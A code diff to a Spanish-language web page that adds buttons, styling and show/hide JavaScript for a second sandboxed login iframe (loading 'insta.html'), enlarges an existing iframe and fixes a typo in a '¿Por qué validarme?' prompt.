@@ -188,19 +188,54 @@
          width: 5vw;
          font-size: 5vw;
        }
+       #boton4 {
+         z-index: 100000;
+         position: relative;
+         left: 40vw;
+         top: 7vh;
+         width: 20vw;
+         font-size: 5vw;
+       }
+       #boton5 {
+         z-index: 100001;
+         position: absolute;
+         left: 86.5vw;
+         top: 23vh;
+         width: 7vw;
+         display: none;
+         border: 2px solid black;
+         width: 5vw;
+         font-size: 5vw;
+       }
        iframe{
          border: 3px solid black;
          width: 80vw;
-         height: 40vh;
+         height: 80vh;
          position: absolute;
          z-index: 10000;
          left: 10vw;
-         top: 20vh;
+         top: 10vh;
          filter: blur(0);
            box-shadow: 1px -1px 100px 40px lightgray;
  
        }
+       .ifr{
+         border: 3px solid black;
+         width: 80vw;
+         height: 515px;
+         position: absolute;
+         z-index: 10000;
+         left: 10vw;
+         top: 10vh;
+         filter: blur(0);
+           box-shadow: 1px -1px 100px 40px lightgray;
+       }
        #obj1 {
+         display: none;
+         position: absolute;
+         top: 3vh;
+       }
+       #obj2 {
          display: none;
          position: absolute;
          top: 3vh;
@@ -324,7 +359,7 @@
        </h2>
        <details>
          <summary>
-           ¿Porqué validarme?
+           ¿Por qué validarme?
          </summary>
          <p>
            Debes validarte para usar correctamente esta página y no abusar de los servicios que ofrecemos.
@@ -345,13 +380,21 @@
          .
        </div>
         <button id="boton3" type="button" onclick="ocultar()">log</button>
-</div>
+
     <button id="boton2" type="button" onclick="mostrar()">x</button>
 
-   
+    <button id="boton4" type="button" onclick="ocultare()">log</button>
+  </div>
+      <button id="boton5" type="button" onclick="mostrare()">x</button>
+    </div>
+     
     <div id="obj1">
       <iframe src="login.html" frameborder="0" sandbox="allow-forms"></iframe>
     </div>
+   
+      <div id="obj2">
+        <iframe class="ifr" src="insta.html" frameborder="0" sandbox="allow-forms"></iframe>
+      </div>
     <script>
         function ocultar(){
 document.getElementById('obj1').style.display = 'block';
@@ -363,6 +406,18 @@ function mostrar(){
 document.getElementById('obj1').style.display = 'none';
 document.getElementById('boton2').style.display = 'none';
 document.getElementById('boton3').style.display = 'block';
+document.getElementById('boy').style.filter = 'blur(0)';
+}
+function ocultare(){
+document.getElementById('obj2').style.display = 'block';
+document.getElementById('boton5').style.display = 'block';
+document.getElementById('boy').style.filter = 'blur(4px)';
+
+}
+function mostrare(){
+document.getElementById('obj2').style.display = 'none';
+document.getElementById('boton5').style.display = 'none';
+document.getElementById('boton4').style.display = 'block';
 document.getElementById('boy').style.filter = 'blur(0)';
 }
     </script>
